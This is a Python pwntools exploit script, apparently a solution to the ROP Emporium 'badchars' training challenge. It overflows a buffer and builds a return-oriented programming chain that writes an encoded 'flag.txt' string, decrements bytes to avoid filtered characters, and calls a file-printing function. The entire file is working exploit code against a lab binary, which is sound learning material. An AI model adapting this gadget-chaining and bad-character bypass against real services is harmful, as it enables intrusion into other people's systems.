from pwn import *

context.arch = "amd64"
context.log_level = "critical"

badchars = b"xga."

elf = ELF("./badchars")
lib = ELF("./libbadchars.so")

writeableSection = 0x0000000000601028 + 8 # In 8 in order to move addresspace to avoid bad chars in address.
movGadget = 0x0000000000400634 # 12 -> 13
diGadget = 0x00000000004006a3
popGadget = 0x000000000040069c # r12 r13 r14 r15
subGadget = 0x0000000000400630
addGadget = 0x000000000040062c
printFileGadget = 0x0000000000400620


def WriteFuckedFlag(rop):
    rop.raw(p64(popGadget))

    # R12
    rop.raw(b"flbh/tyt")

    # R13
    rop.raw(p64(writeableSection + 0))

    # R14 + R15
    rop.raw(b"B"*16)

    rop.raw(p64(movGadget))

def SubtractAt(rop, address):
    rop.raw(p64(popGadget))

    # R12 + R13
    rop.raw(b"B"*16)

    # R14
    rop.raw(0x1)

    # R15
    rop.raw(p64(writeableSection + address))

    rop.raw(p64(subGadget))

def ReadFile(rop):
    rop.raw(p64(diGadget))
    rop.raw(p64(writeableSection))
    rop.raw(p64(printFileGadget))

rop = ROP(elf)
rop.raw("A"*40)
WriteFuckedFlag(rop)
SubtractAt(rop, 2) # a
SubtractAt(rop, 3) # g
SubtractAt(rop, 4) # .
SubtractAt(rop, 6) # x
ReadFile(rop)

print(rop.dump())


for c in badchars:
    if c in rop.chain():
        log.critical("'" + chr(c) + "' in chain")
        exit()


#p = gdb.debug("./badchars", "b *0x000000000040069c\nc")
p = elf.process()

p.recvuntil("> ")
p.sendline(rop.chain())
print(p.recvall().decode("utf-8"))

